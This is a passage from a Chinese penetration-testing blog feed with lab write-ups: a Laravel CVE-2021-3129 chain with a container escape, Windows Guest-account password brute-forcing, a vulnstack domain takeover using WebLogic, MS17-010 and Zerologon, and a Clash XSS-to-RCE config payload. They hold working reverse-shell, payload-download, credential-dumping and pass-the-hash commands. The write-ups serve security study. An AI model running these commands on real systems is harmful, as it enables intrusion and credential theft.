laravel 8.29.0
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1648816131078.png" alt="" loading="lazy"></figure>
<pre><code>POST /_ignition/execute-solution HTTP/1.1
Host: 10.100.202.45:81
Content-Type: application/json
Content-Length: 168

{
  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,
  &quot;parameters&quot;: {
    &quot;variableName&quot;: &quot;username&quot;,
    &quot;viewFile&quot;: &quot;xxxxxxx&quot;
  }
}
</code></pre>
<p> 确认存在CVE-2021-3129<br>
<img src="https://V-alkoinen.github.io/post-images/1648816183045.png" alt="" loading="lazy"></p>
<pre><code>网上找了个exp
https://github.com/simonlee-hello/CVE-2021-3129
微调了一下工具，可以rce
git clone https://github.com/zhzyker/CVE-2021-3129
python3 exp.py http://10.100.202.45:81/
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816220410.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816225211.png" alt="" loading="lazy"><br>
 看这个主机名像个容器<code>cat /proc/self/cgroup</code><br>
<img src="https://V-alkoinen.github.io/post-images/1648816260319.png" alt="" loading="lazy"></p>
<pre><code>curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o 1.py
python 1.py
用suid进行提权，发现一个shell文件
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816544818.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816529464.png" alt="" loading="lazy"><br>
 运行该shell文件后发现是ps命令，于是尝试修改当前终端环境变量</p>
<pre><code>echo '/bin/bash' &gt; ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH
./shell
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816688823.png" alt="" loading="lazy"><br>
 成功提权至root<br>
 <code>git clone https://github.com/cdk-team/CDK</code><br>
<img src="https://V-alkoinen.github.io/post-images/1648816736634.png" alt="" loading="lazy"></p>
<pre><code>python3 -m http.server 8080
curl http://172.16.70.129:8080/cdk -o cdk
./cdk run –list
./cdk evaluate
./cdk auto-escape &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/172.16.70.129/10001 0&gt;&amp;1'&quot;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816793200.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816798041.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816802287.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816806666.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816810797.png" alt="" loading="lazy"><br>
 拿到主机权限，稳定下shell</p>
<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=10001 -f elf &gt; shell-10001.elf
curl http://172.16.70.129:8080/shell-10001.elf -o shell-10001.elf
nohup ./shell-10001.elf &amp;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816889824.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816894361.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816899235.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816903490.png" alt="" loading="lazy"><br>
 搞个ew做代理</p>
<pre><code>curl http://172.16.70.129:8080/ew_for_linux -o ew
chmod +x ew
nohup ./ew -s ssocksd -l 10003 &amp;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817112980.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648817117504.png" alt="" loading="lazy"><br>
 使用fscan进行扫描</p>
<pre><code>proxychains -q ./fscan_amd64 -h 192.168.93.10/24
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817214237.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648817219235.png" alt="" loading="lazy"><br>
 发现一个通达oa，github上找了个exp</p>
<pre><code>https://github.com/z1un/TongdaOA-exp
curl https://raw.githubusercontent.com/z1un/TongdaOA-exp/master/TongdaOA.py -o tongda.py
proxychains -q python3 tongda.py
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817319207.png" alt="" loading="lazy"><br>
 开冰蝎<br>
<img src="https://V-alkoinen.github.io/post-images/1648817350087.png" alt="" loading="lazy"><br>
 上meterpreter</p>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=44445 -f exe -o shell.exe
certutil.exe -urlcache -split -f http://172.16.70.129:8080/shell.exe shhhhhhell.exe
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817527535.png" alt="" loading="lazy"><br>
 抓hash</p>
<pre><code>load kiwi
creds_all
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817588063.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648817592626.png" alt="" loading="lazy"></p>
<p> PTH</p>
<pre><code>impacket-wmiexec -hashes :ab89b1295e69d353dd7614c7a3a80cec administrator@192.168.93.30
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1648817676390.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Win-Brute]]></title>
        <id>https://V-alkoinen.github.io/post/win-brute/</id>
        <link href="https://V-alkoinen.github.io/post/win-brute/">
        </link>
        <updated>2022-03-01T14:20:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-项目地址">一、项目地址</h1>
<p>  <a href="https://github.com/DarkCoderSc/win-brute-logon">https://github.com/DarkCoderSc/win-brute-logon</a></p>
<h1 id="二-测试环境">二、测试环境</h1>
<p>  windows 10（1903）<br>
  windows server 2016（domain：laobai.com）</p>
<h1 id="三-工具用法">三、工具用法</h1>
<p> <code>WinBruteLogon.exe -u &lt;username&gt; -w &lt;wordlist_file&gt;</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646490875505.png" alt="" loading="lazy"></p>
<h1 id="四-介绍">四、介绍</h1>
<p>  该 POC 利用的是 <code>Microsoft Windows</code> 身份验证机制中的一个严重缺点，并不是一个漏洞。<br>
  实际上，通过访客用户（Guest）即可爆破所有本地用户、域内用户的密码。可以参考<code>net user</code>、<code>net user /domain</code>。</p>
<h1 id="五-测试">五、测试</h1>
<p>  Windows 10（PC）：Guest、ljl_s（本地管理员）、user1（域用户）<br>
  Windows Server 2016（DC）：administrator（域管）</p>
<pre><code>net user GuestUser !QAZ2wsx /add
net localgroup users GuestUser /delete
net localgroup guests GuestUser /add
</code></pre>
<p>  使用GuestUser爆破本地管理员密码<br>
  <code>WinBruteLogon.exe -v -d PC1 -u ljl_s -w 1.txt</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646492698000.png" alt="" loading="lazy"><br>
  使用GuestUser爆破域用户密码<br>
  <code>WinBruteLogon.exe -v -d laobai.com -u user1 -w 1.txt</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646492769577.png" alt="" loading="lazy"><br>
  使用GuestUser爆破域管密码<br>
  <code>WinBruteLogon.exe -v -d laobai.com -u administrator -w 1.txt</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646492804408.png" alt="" loading="lazy"><br>
  附赠一个大佬的字典：<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt</a></p>
<h1 id="修复方案">修复方案</h1>
<p> 因该问题并不是一个有效的漏洞，所以我们只能做一些缓解措施：<br>
  1、禁用访客用户；<br>
  2、设置高强度密码。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[vulnstack 2]]></title>
        <id>https://V-alkoinen.github.io/post/vulnstack-2/</id>
        <link href="https://V-alkoinen.github.io/post/vulnstack-2/">
        </link>
        <updated>2022-02-26T11:01:58.000Z</updated>
        <content type="html"><![CDATA[<h1 id="环境">环境</h1>
<p>web：172.16.70.142  10.10.10.80<br>
pc：   172.16.70.143  10.10.10.201<br>
dc：   10.10.10.10</p>
<h1 id="过程">过程：</h1>
<p> <code>nmap -T4 -Pn -sV -O 172.16.70.142</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646132714799.png" alt="" loading="lazy"><br>
 发现142起了个weblogic，github上找个工具扫一下，查看是否有漏洞</p>
<pre><code>git clone https://github.com/rabbitmask/WeblogicScan
pip3 install -r requirements.txt
python3 WeblogicScan.py -u 172.16.70.142 -p 7001
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646132789871.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646132843309.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646132868347.png" alt="" loading="lazy"><br>
 发现版本为10.3.6.0</p>
<pre><code>msfconsole
search weblogic 10.3.6
use 1
set rhosts 172.16.70.142
set lport 9999 
run
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133015955.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133021973.png" alt="" loading="lazy"><br>
 142 getshell，搞个meterperter【<a href="https://qftm.github.io/2019/08/03/Windows-Reverse-Shell/">参考</a>】<br>
 <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=9998 -f exe &gt; ./shell.exe</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133152664.png" alt="" loading="lazy"><br>
 <code>certutil.exe -urlcache -split -f http://192.16.70.129/shell.exe shell.exe</code>【<a href="https://www.cnblogs.com/lfoder/p/8241548.html">参考</a>】<br>
<img src="https://V-alkoinen.github.io/post-images/1646133259291.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133265525.png" alt="" loading="lazy"></p>
<pre><code>msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 9998
run
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133296178.png" alt="" loading="lazy"><br>
 <code>./shell.exe</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133377638.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133383888.png" alt="" loading="lazy"><br>
 <code>Getsystem</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133432888.png" alt="" loading="lazy"></p>
<pre><code>chcp 65001
whoami
ipconfig
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133462022.png" alt="" loading="lazy"><br>
 机器内部有两张网卡，一张是172.16.70.142 另一张是10.10.10.80，收集一波信息</p>
<pre><code>nltest /dclist:
net group “domain controllers” /doman
net user /domain
net group &quot;domain computers&quot; /domain
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133568830.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133575140.png" alt="" loading="lazy"><br>
 搞个<code>mimikatz</code><br>
 <code>git clone https://github.com/gentilkiwi/mimikatz</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133640390.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133646811.png" alt="" loading="lazy"><br>
 <code>certutil.exe -urlcache -split -f http://172.16.70.129/mimikatz.exe mimi.exe</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133683731.png" alt="" loading="lazy"></p>
<pre><code>cd C:\Oracle\Middleware\user_projects\domains\base_domain
Mimi.exe
privilege::debug
log
sekurlsa::logonpasswords
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133820260.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133828228.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133834664.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133841082.png" alt="" loading="lazy"><br>
 <code>此处说一下，我抓hash没发现域管的hash，但看了下网上的writeup都能抓到，我也不知道怎么抓的</code><br>
 <a href="https://www.objectif-securite.ch/en/ophcrack">爆破hash</a><br>
 加路由</p>
<pre><code>bg
use post/multi/manage/autoroute
set sission 1
run
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1646134060731.png" alt="" loading="lazy"></figure>
<pre><code>search ms17
use 1
set rhosts 10.10.10.10
set lhost 10.10.10.80
set lport 10001
run
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646134099583.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646134106311.png" alt="" loading="lazy"><br>
 迁移进程拿shell</p>
<pre><code>Ps
migrate 328
shell
chcp 65001
whoami
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646134229400.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646134235562.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646134241846.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646134566286.png" alt="" loading="lazy"></p>
<h1 id="试用下cve-2020-1472">试用下CVE-2020-1472</h1>
<p> 可利用该漏洞将域控的计算机的机器账号密码置为空，此处指的是 dc$<br>
 <a href="https://github.com/dirkjanm/CVE-2020-1472">CVE-2020-1472</a><br>
 先搞个socks（之前已经添加过route了）</p>
<pre><code>search socks
use 0
run
vim /etc/proxychains4.conf
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1646139686405.png" alt="" loading="lazy"></figure>
<pre><code>curl https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py &gt; 1.py
python3 -m pip install impacket
proxychains -q python3 1.py DC 10.10.10.10
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646139693934.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646139699034.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646139703868.png" alt="" loading="lazy"></p>
<pre><code>proxychains -q impacket-secretsdump de1ay.com/DC\$@10.10.10.10 -no-pass 
proxychains -q impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:bed797322eabe7ceb21dc1a0534fe091 de1ay.com/administrator@10.10.10.10
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646309646321.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646309651604.png" alt="" loading="lazy"></p>
<p>GET!!</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[clash RCE]]></title>
        <id>https://V-alkoinen.github.io/post/clash-rce/</id>
        <link href="https://V-alkoinen.github.io/post/clash-rce/">
        </link>
        <updated>2022-02-26T10:55:58.000Z</updated>
        <content type="html"><![CDATA[<h1 id="clash">CLASH</h1>
<p>  A Windows/macOS/Linux GUI based on Clash and Electron.</p>
<h1 id="rce">RCE</h1>
<p>  <a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">参考链接</a></p>
<h1 id="漏洞复现">漏洞复现</h1>
<pre><code>port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
    type: socks5
    server: 127.0.0.1
    port: &quot;17938&quot;
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: &quot;8088&quot;
    skip-cert-verify: true

proxy-groups:
  -
    name: &lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
    type: select
    proxies:
    - a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646132381999.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646132387621.png" alt="" loading="lazy"></p>
<h1 id="解决方案">解决方案</h1>
<p>  升级至 <code>v 0.19.10</code></p>
]]></content>
    </entry>
</feed>